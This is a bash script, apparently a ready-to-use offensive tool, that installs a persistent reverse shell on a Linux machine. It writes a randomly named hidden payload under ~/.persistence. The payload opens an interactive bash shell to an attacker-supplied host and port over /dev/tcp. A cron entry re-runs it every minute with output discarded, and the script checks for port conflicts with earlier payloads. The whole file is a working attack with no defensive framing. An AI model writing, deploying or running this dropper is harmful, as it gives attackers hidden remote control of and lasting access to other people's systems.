#!/bin/bash

# Usage: ./install_cron_shell.sh <LHOST> <LPORT>
# Full persistence reverse shell dropper w/ port conflict detection

LHOST="$1"
LPORT="$2"
PERSIST_DIR="$HOME/.persistence"

if [[ -z "$LHOST" || -z "$LPORT" ]]; then
  echo -e "\e[91m[!] Usage: $0 <LHOST> <LPORT>\e[0m"
  exit 1
fi

mkdir -p "$PERSIST_DIR"
conflict=0

for f in "$PERSIST_DIR"/.*; do
  [[ -f "$f" ]] || continue
  used_port=$(grep -oP 'tcp/.+?/' "$f" 2>/dev/null | grep -oP '\d+' | head -1)
  if [[ "$used_port" == "$LPORT" ]]; then
    echo -e "\e[91m[!] Conflict: Port $LPORT already used in payload $f\e[0m"
    conflict=1
  fi
done

if [[ "$conflict" -eq 1 ]]; then
  echo -e "\e[91m[!] Aborting. Pick a different port.\e[0m"
  exit 1
fi

RANDNAME=".$(tr -dc a-z0-9 </dev/urandom | head -c 8)"
PAYLOAD="$PERSIST_DIR/$RANDNAME"
CRONLINE="* * * * * bash $PAYLOAD >/dev/null 2>&1"

cat << EOF > "$PAYLOAD"
#!/bin/bash
bash -c 'exec bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'
EOF

chmod +x "$PAYLOAD"

( crontab -l 2>/dev/null | grep -v "$PAYLOAD"; echo "$CRONLINE" ) | crontab -

echo -e "\e[92m[+] Reverse shell cronjob installed.\e[0m"
echo -e "\e[92m[+] Target: $LHOST:$LPORT\e[0m"
echo -e "\e[90m[+] Payload: $PAYLOAD\e[0m"